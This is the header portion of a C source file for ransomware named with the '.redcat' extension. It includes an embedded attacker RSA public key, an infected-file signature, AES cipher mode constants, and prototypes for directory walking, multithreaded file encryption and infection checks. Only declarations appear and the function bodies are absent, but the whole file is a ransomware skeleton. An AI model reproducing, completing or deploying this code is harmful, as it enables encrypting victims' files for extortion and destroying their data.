/* Header files */
#include <stdio.h>
#include <ctype.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <getopt.h>
#include <string.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/stat.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>

/* if this is defined, then the vector will double in capacity each
 * time it runs out of space. if it is not defined, then the vector will
 * be conservative, and will have a capcity no larger than necessary.
 * having this defined will minimize how often realloc gets called.
 */
#define CVECTOR_LOGARITHMIC_GROWTH
#include "cvector.h"

/* Macro constants */
#define AES_128_ECB 0
#define AES_192_ECB 1
#define AES_256_ECB 2
#define AES_128_CBC 3
#define AES_192_CBC 4
#define AES_256_CBC 5
#define MAX_PATH_LENGTH 256
#define CIPHER_MODE_LENGTH 8
#define CIPHER_NAME_LENGTH 12

/* Macro string literals */
#define ATK_RSA_PUBLIC_KEY "-----BEGIN PUBLIC KEY-----\n" \
    "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAySDRKBBg/2npTTbPhoz1\n" \
    "nd0Wht8iNs5f/fP0xSBu85PhLuYHsAQ0H2yNB5kVaKBgnXSEiix+tto59v73LF7S\n" \
    "aRmh5+o4PkZrSPO+eeptsk6Y2MM5VGzuSu2+sszDIRZnnJONaRf+6lX+lnEipVDM\n" \
    "CrFCQ9A+0M8hLpAxhiue6I6xdCltjKgPJgMZIOSSW7TKv26JXryCm5zA6lDQm5X4\n" \
    "yNiXAgfb1JX2WgT1TJpbaTPHs7AILMBKS3DUDKNMeFUD0VSsjrPRwzVS2qdz5e4B\n" \
    "nziQ0PeRCHSR/0cFDH0/C8hMQyt3p983DXChzT5QswlSmaj1xK5qXuJEHHTHiUm3\n" \
    "deF+eZbgg8lzGqXglaX8XxFl7OIEhMcwq0vJqlVEUzUNgBcUyisydxwC6SJ84WE0\n" \
    "4a9+aDmOycdVCYEr9C9GfRH67oD466hsWLH6t6+/18GfK7P4SiWPTMOOtrpcczjr\n" \
    "XSoQaRQA12JnZkHgim5pm5eS0XtDT2f+qSdOhUWsL1DzG1jlq/3/sMjPIC9+jTuZ\n" \
    "Xp+fw3+twf+tXCnF0ljT4vW+Cxx7YqOrKIvN58SlVjG1GhNN63dlRwKqa5pKe9fB\n" \
    "SkVPW+yTAMU+nB6QtZbluW+OFqR5kDbisQwBhCLjv+aodrMKQraRiy8ajOwDkMOd\n" \
    "BUhaUPlEJGIFfpI0XB7J6CkCAwEAAQ==\n" \
    "-----END PUBLIC KEY-----"
#define INFECTED_FILE_EXT ".redcat"
#define INFECTED_FILE_SIG 0xBAADF00D

typedef struct
{
    cvector_vector_type(char*) paths;
    char* ciphername;
} thread_args;

typedef struct
{
    unsigned char* iv;
    unsigned char* key;
    int mode;
    int signature;
} footer;

/* Prototype of functions */
void print_usage();
int is_infected_file(char* path);
int ciphername_to_number(char* ciphername);
int worker_encryption_proc(thread_args* args);
int encrypt_file(char* path, char* ciphername);
int gen_random_bytes(unsigned char* buf, int size);
int is_valid_options(int key_size, char* mode, char* target);
void walkdir(cvector_vector_type(char*)* paths, char* parent_dir);
int do_encrypt(cvector_vector_type(char*)* paths, int key_size, char* mode);
int parse_options(int* key_size, char* mode, char* target, int argc, char** argv);

